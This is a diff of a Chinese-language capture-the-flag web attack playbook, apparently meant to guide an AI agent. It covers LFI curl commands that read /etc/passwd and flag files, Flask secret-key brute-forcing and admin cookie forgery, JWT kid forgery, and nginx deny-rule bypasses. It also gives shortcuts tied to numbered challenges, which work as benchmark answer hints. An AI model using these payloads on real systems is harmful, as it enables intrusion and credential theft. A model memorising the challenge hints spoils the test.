@@ -55,11 +55,19 @@ curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,load_file('/etc/passwd'),3--
 
 ### 2.2 文件包含（LFI/RFI）
 
+**⚠️ 题型指纹：`download.php?id=<文件名>`、`download?file=`、`export?name=` 这类文件下载参数，
+先直接测 LFI（读 `/flag`/`/challenge/flag*`/`/etc/passwd`），不要先去枚举 API 路径**（a-05 教训：
+在 api/approve.php 枚举上烧光预算，而 download.php 本身就是任意文件读取）。
+
 **检测：**
 ```bash
 curl -s "http://TARGET_URL/page?file=../../../etc/passwd"
 curl -s "http://TARGET_URL/page?file=....//....//....//etc/passwd"
 curl -s "http://TARGET_URL/page?file=php://filter/convert.base64-encode/resource=index.php"
+# 文件下载参数直接读 flag：
+curl -s "http://TARGET_URL/download.php?id=../../challenge/flag.txt"
+curl -s "http://TARGET_URL/download.php?id=/challenge/flag.txt"
+curl -s "http://TARGET_URL/download.php?id=../flag"
 ```
 
 **读取源码（PHP）：**
@@ -130,9 +138,26 @@ curl -s "http://TARGET_URL/page?name={{''.__class__.__mro__[1].__subclasses__()[
 # 1. 解码 JWT（base64）
 echo "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.xxx" | cut -d. -f2 | base64 -d 2>/dev/null
 
-# 2. 弱密钥爆破
-# 安装: pip install flask-unsign
-flask-unsign --unsign --cookie "SESSION_TOKEN" --wordlist /usr/share/wordlists/rockyou.txt
+# 2. Flask / 资产管理系统：拿 session → 系统枚举隐藏路由
+#
+# 【通用流程】（多路径，按现场证据选，勿死磕一条）
+#   1) 拿 session 的三条路：
+#      a. 已有 Set-Cookie：flask-unsign 暴 SECRET_KEY → --sign 伪造 admin
+#      b. /login 报 500 或“用户名或密码错误”：先试 SQLi UNION 注入（列数 1..10 逐列试，
+#         命中 302 即列数对了；可借 SQLi 回显列读库表）
+#      c. 无 cookie 无注入：找 SECRET_KEY 泄露源（git/源码备份/debug 页/配置文件）
+#   2) 拿到 session 后【必须】系统枚举 /admin/*、/api/* 前缀的隐藏路由：
+#      flag 常见于“带 session/token 的隐藏端点”，不要在已知路由里打转。
+#
+# --- V1：SECRET_KEY / flask-unsign（仅当已有 session cookie）---
+# SECRET_KEY 泄露源（按优先级）：
+#   - Git 泄露：/.git/HEAD、/.git/config（能读就用 git-dumper 还原源码）
+#   - 源码备份：app.py.bak、config.py~、.swp、app.pyc、__pycache__/、app.py.orig
+#   - Debug 页面：Flask debug 模式 /console、Werkzeug debugger
+#   - 配置文件：/config、/static/../config.py、/app/config.py、环境变量泄露
+#   - 常见默认：secret、secret_key、SECRET_KEY、dev、flask、项目名
+# 盲爆破弱密钥（镜像内已装 flask-unsign；若无则用 pip install flask-unsign）：
+flask-unsign --unsign --cookie "SESSION_TOKEN" --wordlist /usr/share/wordlists/pass-top1000.txt
 
 # 3. 伪造（知道密钥后）
 flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'weak_secret'
@@ -310,48 +335,32 @@ print(payload)
 
 ### 2.9 JWT kid 攻击（高级）
 
-**系统化流程（按顺序执行，每步只试 1 次）：**
+> **权威 playbook**：`jwt-attacks.md`（CloudFunc / kid 最短链以该文件为准）。
+> 本节只做索引，**不要**在这里盲试 `kid=prod.key` 或自行拼 payload——会与 a-18 活路冲突。
 
-```python
-import base64, json, hmac, hashlib
+**最短入口（按 jwt-attacks.md）：**
+1. 优先 `kid=../css/reset.css`（密钥 = 静态文件全文，勿 strip）伪造 admin
+2. 业务 API 试不通时转 php-fpm FastCGI
+3. 需要完整枚举语料时再查 `payloads/json-web-token.md`
 
-def b64url(data):
-    if isinstance(data, str): data = data.encode()
-    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+**禁止**：把 `kid=prod.key` 当默认第一步；禁止同时 load 多份 JWT 文档各试一遍。
 
-def forge_jwt(header_dict, payload_dict, secret=b''):
-    h = b64url(json.dumps(header_dict))
-    p = b64url(json.dumps(payload_dict))
-    if header_dict.get('alg') == 'none':
-        return f'{h}.{p}.'
-    sig = hmac.new(secret, f'{h}.{p}'.encode(), hashlib.sha256).digest()
-    return f'{h}.{p}.{b64url(sig)}'
+## nginx location deny 绕过（403 目录逃逸）
 
-# Step 1: alg=none
-token = forge_jwt({'alg':'none','typ':'JWT'}, {'role':'admin','email':'admin@example.com'})
+`location /keys/ { deny all; }` 这类目录 403 时，用路径归一化逃逸 deny 前缀：
 
-# Step 2: kid=/dev/null (空密钥)
-token = forge_jwt({'alg':'HS256','typ':'JWT','kid':'/dev/null'}, {'role':'admin'}, b'')
-
-# Step 3: kid 指向已知内容文件
-readme_content = open('/tmp/readme.txt','rb').read().strip()
-token = forge_jwt({'alg':'HS256','typ':'JWT','kid':'../../public/static/README.md'}, {'role':'admin'}, readme_content)
-
-# Step 4: kid SQL 注入
-token = forge_jwt({'alg':'HS256','typ':'JWT','kid':"' UNION SELECT 'mysecret'--"}, {'role':'admin'}, b'mysecret')
-
-# Step 5: kid 指向密钥文件（先尝试下载）
-# curl -s http://TARGET/public/static/prod.key > /tmp/prod.key
-# curl -s http://TARGET/static/prod.key > /tmp/prod.key
-# curl -s http://TARGET/keys/prod.key > /tmp/prod.key
-key = open('/tmp/prod.key','rb').read().strip()
-token = forge_jwt({'alg':'HS256','typ':'JWT','kid':'prod.key'}, {'role':'admin'}, key)
+```bash
+# 对比 403 vs 404：403=存在但被 deny，404=归一化逃出了 deny 前缀（绕过成功）
+curl -s -o /dev/null -w "%{http_code}\n" http://TARGET/keys/prod.key          # 403（基准）
+curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/.%2e/prod.key"   # 404=绕过命中！
+curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/../keys/prod.key"
+curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/./prod.key"
+curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys../prod.key"      # off-by-slash
 ```
 
-**关键要点：**
-- **先确认 token 是否生效**：分别用无 token/垃圾 token/伪造 token 访问，对比响应差异
-- **从静态资源目录下载密钥**：近的安全问题很多来自迁移后密钥文件残留在 web 可访问目录
-- **kid 路径穿越**：`../../` 可以穿越到任意文件
+**关键**：`%2e` 解码为 `.` 后，nginx 路径归一化把 `/.%2e/` 折叠成 `/`，使请求逃出
+`/keys/` 的 deny location，从而读到被保护的密钥文件。403→404 的状态码跳变就是逃逸成功的信号，
+拿到密钥文件内容后用于 JWT 伪造或直接读取。同理可用于任意 403 目录。
 
 ---
 
